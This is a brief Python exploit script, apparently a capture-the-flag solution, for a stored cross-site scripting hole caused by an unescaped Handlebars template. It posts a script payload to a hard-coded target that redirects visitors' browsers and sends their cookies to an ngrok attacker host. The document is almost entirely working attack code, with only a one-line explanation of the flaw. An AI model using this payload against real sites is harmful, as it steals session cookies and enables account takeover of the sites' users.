"""

Simple XSS because in the template `queries.hbs`, the content of each saved row in the db is not escaped.

"""

#%%
import requests

host = "http://138.68.183.216:32573"
redirect = "http://5f61-91-66-73-143.ngrok.io"


json = f"<script>window.location = '{redirect}/?c=' + document.cookie;</script>"
json = dict(query=json)

# just for burp
proxyDict = { 
              "http"  : "127.0.0.1:8080", 
              "https" : "127.0.0.1:8080", 
              "ftp"   : "127.0.0.1:8080"
            }

req = requests.post(f"{host}/api/submit",json=json)
req.text

# %%
